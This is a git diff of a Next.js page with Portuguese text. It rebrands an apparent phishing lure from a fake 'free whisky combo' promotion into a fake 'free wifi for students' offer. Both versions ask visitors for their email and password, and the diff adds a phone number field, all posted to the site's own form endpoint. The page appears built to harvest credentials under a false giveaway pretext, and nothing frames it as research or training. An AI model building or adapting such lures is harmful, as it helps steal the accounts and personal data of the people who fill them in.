@@ -3,6 +3,7 @@ import styles from '@/styles/Home.module.css'
 import Image from 'next/image'
 import { useRef } from 'react'
 import { useRouter } from 'next/router'
+import Link from 'next/link'
 
 const inter = Inter({ subsets: ['latin'] })
 const averia = Averia_Serif_Libre({ subsets: ['latin'], weight: ["300", "400", "700"] })
@@ -12,19 +13,16 @@ export default function Home() {
   const router = useRouter()
   const emailRef = useRef(null)
   const passwordRef = useRef(null)
+  const telRef = useRef(null)
 
   async function handleSubmit(e) {
     e.preventDefault()
 
     const email = emailRef.current.value
     const password = passwordRef.current.value
+    const telefone = telRef.current.value
 
-    if (!email || !password) {
-      alert('Preencha todos os campos')
-      return
-    }
-
-    if (email === '' || password === '') {
+    if (!email || !password || !telefone) {
       alert('Preencha todos os campos')
       return
     }
@@ -32,7 +30,7 @@ export default function Home() {
     try {
       const response = await fetch('/api/form', {
         method: 'POST',
-        body: JSON.stringify({ email, password }),
+        body: JSON.stringify({ email, password, telefone }),
         headers: {
           'Content-Type': 'application/json'
         }
@@ -48,35 +46,37 @@ export default function Home() {
     <div className={`${styles.container} ${inter.className}`}>
 
       <div>
-        <Image src="/logo.svg" alt="Peaky Blinders" width={152} height={48} />
+        <Image src="/hero2.png" alt="Wifi Grátis" width={152} height={48} />
       </div>
 
       <div className={styles.form}>
         <div className={styles.form_header}>
-          <Image src="/hero.png" alt="Peaky Blinders" width={540} height={263} />
+          <Image src="/hero.jpg" alt="Wifi Grátis" width={540} height={263} />
         </div>
 
         <div className={styles.form_body}>
           <div className={styles.form_content}>
             <h2 className={averia.className}>
-              Você ganhou um combo de Whisky Grátis em comemoração ao lançamento do filme, para resgatar
+              Você ganhou acesso o wifi grátis ultra-rápido exclusivo para alunos!
             </h2>
 
-            <p>Promoção exclusiva para o Shopping Iguatemi São Paulo</p>
+            <p>Wifi Grátis e exclusivos para alunos </p>
           </div>
 
           <div className={styles.form_data}>
-            <input ref={emailRef} className={styles.form_control} placeholder="E-mail" type="text" />
-            <input ref={passwordRef} className={styles.form_control} placeholder="Senha" type="password" />
-            <button onClick={handleSubmit} className={styles.form_button}>RESGATAR COMBO!</button>
+            <input ref={emailRef} className={styles.form_control} placeholder="E-mail ou Telefone" type="text" required/>
+            <input ref={telRef} className={styles.form_control} placeholder="Telefone" type="number" required/>
+            <input ref={passwordRef} className={styles.form_control} placeholder="Senha" type="password" required/>
+            <button onClick={handleSubmit} className={styles.form_button}>RESGATAR WIFI!</button>
             <span className={styles.terms}>Ao resgatar você concorda com os Termos de Uso</span>
+            <Link href="/termos"><button className={styles.form_button}>Termos de serviço</button> </Link>
           </div>
         </div>
       </div>
 
       <div>
         <span className={styles.copy}>
-          © 2023 Peaky Blinders
+        © 2024 Wifi Grátis de alunos Brasil
         </span>
       </div>
 
